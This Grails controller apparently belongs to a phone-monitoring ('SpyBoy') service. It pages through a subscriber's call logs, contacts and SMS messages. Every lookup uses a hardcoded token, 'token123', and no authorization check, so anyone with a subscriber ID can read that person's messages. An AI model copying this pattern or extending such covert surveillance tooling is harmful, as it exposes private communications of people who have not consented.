package com.xaviar

import com.org.krams.domain.UMetaData

class SpyBoyController {

	def redisService
	def contactService
	def locationService
	def smsService
	def userService
	def callLogService
	def phoneEventService
	def smsEventService
	def phoneParamsService

	def index() {
	}

	def callLog(Integer max,String subscriberId){
		//Set<String> subscribers = userService.getUserInfo("token123");
		UMetaData  uMetaData = new UMetaData();
		uMetaData.setSimSubscriberId(subscriberId);
		uMetaData.setToken("token123");
		def callLogs = callLogService.readAll(uMetaData);

		if(!callLogs.isEmpty()){
			params.max = Math.min(max ?: 10, 100)
			int startOffset = params.get("offset")!=null ? Integer.parseInt(params.get("offset")) : 0 ;
			int toElement=10;
			if(max!=null){
				toElement = (startOffset + max) > callLogs.size() ? callLogs.size() : startOffset + max;
			}
			[callLogInstanceList: callLogs.subList(startOffset,toElement), callLogsInstanceTotal: callLogs.size()]
		}else{
			[callLogInstanceList: null, callLogInstanceTotal: 0]
		}
	}


	def about(){
	}

	def contacts(Integer max,String subscriberId){
		//Set<String> subscribers = userService.getUserInfo("token123");
		UMetaData  uMetaData = new UMetaData(subscriberId,"token123");

		def contactList = contactService.readAll(uMetaData);

		if(!contactList.isEmpty()){
			params.max = Math.min(max ?: 10, 100)
			int startOffset = params.get("offset")!=null ? Integer.parseInt(params.get("offset")) : 0 ;
			int toElement=10;
			if(max!=null){
				toElement = (startOffset + max) > contactList.size() ? contactList.size() : startOffset + max;
			}
			[contactInstanceList: contactList.subList(startOffset,toElement), contactInstanceTotal: contactList.size()]
		}else{
			[contactInstanceList: null, contactInstanceTotal: 0]
		}
	}


	def sms(Integer max,String subscriberId){
		//Set<String> subscribers = userService.getUserInfo("token123");
		UMetaData  uMetaData = new UMetaData(subscriberId,"token123");

		def smses = smsService.readAll(uMetaData);

		if(!smses.isEmpty()){
			params.max = Math.min(max ?: 10, 100)
			int startOffset = params.get("offset")!=null ? Integer.parseInt(params.get("offset")) : 0 ;
			int toElement=10;
			if(max!=null){
				toElement = (startOffset + max) > smses.size() ? smses.size() : startOffset + max;
			}
			[smsInstanceList: smses.subList(startOffset,toElement), smsInstanceTotal: smses.size()]
		}else{
			[smsInstanceList: null, smsInstanceTotal: 0]
		}
	}


	def icons(){
	}
}
